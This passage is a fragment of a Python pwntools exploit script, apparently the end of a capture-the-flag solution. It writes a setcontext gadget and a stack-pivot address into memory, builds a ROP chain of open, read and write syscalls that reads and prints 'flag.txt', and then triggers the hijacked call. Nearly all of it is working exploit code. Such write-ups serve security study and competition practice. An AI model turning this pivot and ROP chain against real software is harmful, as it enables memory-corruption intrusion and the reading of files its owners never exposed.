# write what to call, setcontext gadget, to rdx + 0x20
rel_write(0x20, libc.symbols["setcontext"] + 61)
# write where to pivot, original_mmap+0x100 to rbx + 0xa0
rel_write(0xA0, 0x100)
# rdx + a8 is pushed, so we need a ret gadget here
rel_write(0xA8, libc.symbols["setcontext"] + 334)

# ----------- rop chain -----------
rop = ROP(libc)
write(ld.symbols["_r_debug"], b"flag.txt\x00")
# open, read, write
rop.call(
    "syscall",
    [
        constants.linux.amd64.SYS_open,
        ld.symbols["_r_debug"],
        0,
    ],
)
rop.call(
    "syscall",
    [
        constants.linux.amd64.SYS_read,
        3,
        ld.symbols["_r_debug"],
        64,
    ],
)
rop.call(
    "syscall",
    [
        constants.linux.amd64.SYS_write,
        constants.STDOUT_FILENO,
        ld.symbols["_r_debug"],
        64,
    ],
)
# this is so hacky and so wrong but i do not care
def is_ptr(ptr): return ptr > 0x1000


for i, gadget in enumerate(rop.build()):
    if isinstance(gadget, bytes):
        write(0x100 + i * 8, gadget)
    elif is_ptr(gadget):
        rel_write(0x100 + i * 8, gadget)
    else:
        write(0x100 + i * 8, p64(gadget))

# ----------- win -----------
call_fn(rbx_write_call)
```